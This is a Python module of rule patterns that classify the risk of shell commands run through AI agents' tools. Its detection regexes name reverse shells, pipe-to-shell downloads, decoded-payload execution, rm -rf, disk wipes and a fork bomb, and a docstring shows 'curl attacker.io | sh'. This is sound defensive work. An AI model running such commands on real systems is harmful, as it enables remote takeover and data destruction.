"""TG01 -- Shell/Process Execution Risk.

Ported from ``packages/toolgovern/src/classifier/shell-risk.ts``.

A tool named ``bash``, ``shell``, or ``exec`` running ``ls`` and the same tool running
``curl attacker.io | sh`` are the same tool name and very different risk. These rules look at
the actual command string, not the tool name, so they fire regardless of what a given framework
happens to call its shell-execution tool.
"""

from __future__ import annotations

import re
from dataclasses import dataclass
from typing import Callable, List, Optional

from ..types import RuleContext, RuleMatch
from .util import extract_command, normalize_for_match, stringify_args

_CATEGORY = "TG01"


def _command_text(ctx: RuleContext) -> str:
    """Normalizes and lowercases the call's command-like text before any rule pattern-matches
    against it, so quote-splitting, $IFS-as-space, and invisible Unicode formatting characters
    cannot be used to dodge a literal token match."""
    return normalize_for_match(extract_command(ctx.args) or stringify_args(ctx.args)).lower()


def _command_text_cased(ctx: RuleContext) -> str:
    """Case-preserving sibling of ``_command_text``. ``TG01-context-flood`` needs this for
    ``ls``, where ``-R`` (recursive) and ``-r`` (reverse-sort, harmless) only differ by case."""
    return normalize_for_match(extract_command(ctx.args) or stringify_args(ctx.args))


@dataclass
class _Rule:
    id: str
    category: str
    description: str
    _evaluate: Callable[[RuleContext], Optional[RuleMatch]]

    def evaluate(self, ctx: RuleContext) -> Optional[RuleMatch]:
        return self._evaluate(ctx)


def _match(rule_id: str, decision: str, reason: str, matched_argument: str) -> RuleMatch:
    return RuleMatch(
        rule_id=rule_id,
        category=_CATEGORY,  # type: ignore[arg-type]
        decision=decision,  # type: ignore[arg-type]
        reason=reason,
        matched_argument=matched_argument,
    )


# Captures the whole `rm` invocation up to the next command separator (;, &, |, newline) or end
# of string -- a single bounded negated-character-class capture, so no nested quantifiers and no
# ReDoS exposure (same safety class as the rest of this file's patterns). The captured segment is
# tokenized and scanned in full below rather than requiring flags to sit in one contiguous run
# immediately after `rm`: GNU coreutils' getopt permutes argv, so `rm -f /home/victim -r` still
# executes as `rm -rf /home/victim` even though the `-r` trails the path -- a
# flags-must-be-contiguous-and-leading regex misses that entirely.
_RM_SEGMENT_PATTERN = re.compile(r"\brm\s+([^;&|\n]*)", re.IGNORECASE)

# Matches both short combined flags (-rf, -fr) and GNU long flags (--recursive, --force) -- the
# character class already covers hyphens, so a long flag like --recursive (16 chars after the
# leading -) matches this bound without a separate long-flag alternative.
_FLAG_TOKEN_PATTERN = re.compile(r"^-[a-z-]{1,18}$")


def _rm_rf_evaluate(ctx: RuleContext) -> Optional[RuleMatch]:
    text = _command_text(ctx)
    found = _RM_SEGMENT_PATTERN.search(text)
    if not found:
        return None
    tokens = found.group(1).strip().split()
    has_force = False
    has_recursive = False
    target = ""
    for token in tokens:
        if _FLAG_TOKEN_PATTERN.match(token):
            if "f" in token:
                has_force = True
            if "r" in token:
                has_recursive = True
            continue
        if not target:
            target = token
    if not has_force or not has_recursive:
        return None
    high_blast_radius = bool(re.match(r"^(/|~|\*|\.$|\./\*?$)", target)) or target == ""
    if not high_blast_radius:
        return None
    return _match(
        "TG01-rm-rf",
        "deny",
        "rm -rf (or equivalent) targeting a root/home/wildcard path.",
        found.group(0),
    )


_DECODE_STEP_PATTERN = re.compile(
    r"\b(base64\s+(-d|--decode)\b|openssl\s+(base64|enc)\s+[^|]*-d\b|xxd\s+-r\b|"
    r"certutil\s+-decode\b|python[0-9.]*\s+-c\s*['\"].*b64decode)",
    re.IGNORECASE,
)
_FEEDS_EXECUTION_PATTERN = re.compile(
    r"(\|\s*(sudo\s+)?(sh|bash|zsh|python[0-9.]*|perl|node)\b|`|\$\(|\b(sh|bash)\s+-c\b|"
    r"\beval\b|\bexec\b)",
    re.IGNORECASE,
)


def _decoded_payload_execution_evaluate(ctx: RuleContext) -> Optional[RuleMatch]:
    text = _command_text(ctx)
    if not _DECODE_STEP_PATTERN.search(text):
        return None
    if not _FEEDS_EXECUTION_PATTERN.search(text):
        return None
    return _match(
        "TG01-decoded-payload-execution",
        "deny",
        "Decoded payload (base64/hex/etc.) is piped or substituted into a shell/interpreter for execution.",
        text[:200],
    )


_PIPE_TO_SHELL_PATTERN = re.compile(
    r"\b(curl|wget)\b[^|]*\|\s*(sudo\s+)?(sh|bash|zsh|python[0-9.]*|perl|node)\b", re.IGNORECASE
)


def _pipe_to_shell_evaluate(ctx: RuleContext) -> Optional[RuleMatch]:
    text = _command_text(ctx)
    found = _PIPE_TO_SHELL_PATTERN.search(text)
    if not found:
        return None
    return _match(
        "TG01-pipe-to-shell",
        "deny",
        "Pipe-to-shell pattern: remote payload executed without inspection.",
        found.group(0),
    )


_SUDO_PATTERN = re.compile(r"\b(sudo|doas)\s+\S+", re.IGNORECASE)


def _sudo_evaluate(ctx: RuleContext) -> Optional[RuleMatch]:
    text = _command_text(ctx)
    found = _SUDO_PATTERN.search(text)
    if not found:
        return None
    return _match(
        "TG01-sudo", "require-approval", "Command escalates privileges via sudo/doas.", found.group(0)
    )


# Same segment-then-tokenize approach as _RM_SEGMENT_PATTERN above, for the same reason: a
# preceding-flag-group regex ((-[a-z]+\s+)?) fails to match GNU long flags like --recursive (the
# second character is -, not a-z), which makes the *entire* match fail rather than just the flag
# capture -- `chmod --recursive 777 /path` matched nothing at all under the old pattern. Scanning
# every token in the segment means flag form/position/count no longer matter; only whether a
# dangerous permission argument appears anywhere in the command.
_CHMOD_SEGMENT_PATTERN = re.compile(r"\bchmod\s+([^;&|\n]*)", re.IGNORECASE)
_CHMOD_DANGEROUS_PERMISSION_PATTERN = re.compile(r"^(777|a\+rwx|o\+w|0777)$", re.IGNORECASE)


def _chmod_777_evaluate(ctx: RuleContext) -> Optional[RuleMatch]:
    text = _command_text(ctx)
    found = _CHMOD_SEGMENT_PATTERN.search(text)
    if not found:
        return None
    tokens = found.group(1).strip().split()
    dangerous = next((t for t in tokens if _CHMOD_DANGEROUS_PERMISSION_PATTERN.match(t)), None)
    if not dangerous:
        return None
    return _match(
        "TG01-chmod-777",
        "deny",
        "chmod grants world-writable or world-executable permissions.",
        found.group(0),
    )


_FORK_BOMB_PATTERN = re.compile(r":\s*\(\s*\)\s*\{\s*:\s*\|\s*:\s*&?\s*\}\s*;\s*:")


def _fork_bomb_evaluate(ctx: RuleContext) -> Optional[RuleMatch]:
    text = _command_text(ctx)
    found = _FORK_BOMB_PATTERN.search(text)
    if not found:
        return None
    return _match(
        "TG01-fork-bomb", "deny", "Fork-bomb pattern -- unbounded process spawning.", found.group(0)
    )


_REVERSE_SHELL_PATTERN = re.compile(
    r"(nc\s+-e\s+\S+|/dev/tcp/\S+|bash\s+-i\s*>&\s*/dev/tcp)", re.IGNORECASE
)


def _reverse_shell_evaluate(ctx: RuleContext) -> Optional[RuleMatch]:
    text = _command_text(ctx)
    found = _REVERSE_SHELL_PATTERN.search(text)
    if not found:
        return None
    return _match(
        "TG01-reverse-shell",
        "deny",
        "Reverse-shell / raw TCP socket redirection pattern.",
        found.group(0),
    )


_DISK_WIPE_PATTERN = re.compile(
    r"\b(mkfs(\.\w+)?\s+/dev/|dd\s+[^|]*of=/dev/(sd|hd|nvme|disk)\w*)", re.IGNORECASE
)


def _disk_wipe_evaluate(ctx: RuleContext) -> Optional[RuleMatch]:
    text = _command_text(ctx)
    found = _DISK_WIPE_PATTERN.search(text)
    if not found:
        return None
    return _match(
        "TG01-disk-wipe", "deny", "Direct write/format targeting a raw block device.", found.group(0)
    )


# A bare ~, *, or the current directory (., ./, ./*) -- the same "no real scope" shape
# TG01-rm-rf's high_blast_radius check treats as high-risk. An empty string (no path argument
# captured at all) counts the same way: there is nothing bounding how much output comes back.
#
# Absolute paths are handled separately below by depth rather than by a bare "starts with /"
# check: unlike rm -rf, where any leading / is a reasonable danger proxy, a deep, specific
# absolute path is exactly the pattern well-behaved coding agents are expected to use and must
# not be flagged just because it's absolute.
def _is_unscoped_path(target: str) -> bool:
    if target == "":
        return True
    if re.match(r"^(~|\*|\.$|\./\*?$)", target):
        return True
    if target.startswith("/"):
        # Root or shallow (<=2 segments after stripping the leading /) is still broad enough to
        # enumerate a huge fraction of the filesystem. 3+ segments is specific enough to be a
        # genuinely scoped target and is not flagged.
        segments = [s for s in target.split("/") if s]
        return len(segments) <= 2
    return False


# Flag tokens are bounded and \s+-separated for the same ReDoS-avoidance reason as RM_PATTERN
# above. Group 1 is the flag cluster, group 2 (optional) is the path argument immediately
# following it.
_LS_PATTERN = re.compile(r"\bls\s+((?:-[a-z-]{1,16}\s+)*-[a-z-]{1,16})(?:\s+(\S+))?", re.IGNORECASE)

# find's first positional argument is conventionally its search root. This is a regex-level
# approximation, not real argv parsing -- a leading option before the path (find -L / ...) will
# not be captured as the target and this rule will simply miss it, consistent with this file's
# existing "false negative over false positive" bias.
_FIND_PATTERN = re.compile(r"\bfind\s+(\S+)", re.IGNORECASE)
_FIND_MAXDEPTH_PATTERN = re.compile(r"-maxdepth\s+\d+", re.IGNORECASE)

# Group 1 is the flag cluster -- -[a-z-]{1,20} already matches --recursive (the class includes
# the hyphen, so the second leading dash is consumed by it too), so no separate long-flag
# alternative is needed. The first non-capturing group consumes the search pattern (quoted or
# bare); group 2 (optional) is the path argument that follows it.
_GREP_RECURSIVE_PATTERN = re.compile(
    r"\bgrep\s+((?:-[a-z-]{1,20}\s+)*-[a-z-]{1,20})\s+(?:\"[^\"]*\"|'[^']*'|\S+)(?:\s+(\S+))?",
    re.IGNORECASE,
)

# A ** globstar segment anywhere in a cat target -- a single-level glob (cat *.log) is common
# and usually bounded by directory size; a recursive globstar has no such bound.
_CAT_GLOBSTAR_PATTERN = re.compile(r"\bcat\s+\S*\*\*\S*", re.IGNORECASE)


def _context_flood_evaluate(ctx: RuleContext) -> Optional[RuleMatch]:
    cased = _command_text_cased(ctx)

    ls_found = _LS_PATTERN.search(cased)
    if ls_found:
        flags = ls_found.group(1) or ""
        target = ls_found.group(2) or ""
        # -R (capital) is recursive; -r (lowercase) is reverse-sort order and harmless here --
        # this is exactly why this check runs against the case-preserving `cased` text.
        if "R" in flags and _is_unscoped_path(target):
            return _match(
                "TG01-context-flood",
                "require-approval",
                "Recursive `ls -R` with no scoped path -- can dump an unbounded directory tree into context.",
                ls_found.group(0),
            )

    find_found = _FIND_PATTERN.search(cased)
    if (
        find_found
        and not _FIND_MAXDEPTH_PATTERN.search(cased)
        and _is_unscoped_path(find_found.group(1) or "")
    ):
        return _match(
            "TG01-context-flood",
            "require-approval",
            "`find` over an unscoped root with no -maxdepth -- can enumerate an unbounded number of results.",
            find_found.group(0),
        )

    grep_found = _GREP_RECURSIVE_PATTERN.search(cased)
    if grep_found:
        flags = grep_found.group(1) or ""
        target = grep_found.group(2) or ""
        # Unlike ls, grep's -r and -R are both recursive (no reverse-sort ambiguity), so a
        # plain case-insensitive check for the letter r in the flag cluster is enough.
        if re.search("r", flags, re.IGNORECASE) and _is_unscoped_path(target):
            return _match(
                "TG01-context-flood",
                "require-approval",
                "Recursive `grep -r`/`-R` with no scoped path -- can flood context with matches from an entire filesystem tree.",
                grep_found.group(0),
            )

    cat_found = _CAT_GLOBSTAR_PATTERN.search(cased)
    if cat_found:
        return _match(
            "TG01-context-flood",
            "require-approval",
            "`cat` over a recursive globstar -- can concatenate an unbounded number of files into context.",
            cat_found.group(0),
        )

    return None


shell_risk_rules: List[_Rule] = [
    _Rule("TG01-rm-rf", _CATEGORY, "Recursive/forced delete of a root, home, or wildcard-rooted path.", _rm_rf_evaluate),
    _Rule("TG01-pipe-to-shell", _CATEGORY, "A download (curl/wget) piped directly into a shell or interpreter.", _pipe_to_shell_evaluate),
    _Rule("TG01-sudo", _CATEGORY, "Privilege escalation via sudo/doas.", _sudo_evaluate),
    _Rule("TG01-chmod-777", _CATEGORY, "World-writable/executable permission grant.", _chmod_777_evaluate),
    _Rule("TG01-fork-bomb", _CATEGORY, "Classic shell fork-bomb pattern.", _fork_bomb_evaluate),
    _Rule("TG01-reverse-shell", _CATEGORY, "Reverse-shell / raw TCP redirection patterns.", _reverse_shell_evaluate),
    _Rule("TG01-disk-wipe", _CATEGORY, "Direct disk/block-device overwrite.", _disk_wipe_evaluate),
    _Rule(
        "TG01-decoded-payload-execution",
        _CATEGORY,
        "A base64/hex-decoded (or similarly obfuscated) payload is fed into a shell or interpreter for execution, without a literal curl/wget token for TG01-pipe-to-shell to match.",
        _decoded_payload_execution_evaluate,
    ),
    _Rule(
        "TG01-context-flood",
        _CATEGORY,
        "Read-only, high-output-volume command (unscoped recursive listing/search/concatenation) that risks flooding the agent context window rather than a security breach.",
        _context_flood_evaluate,
    ),
]
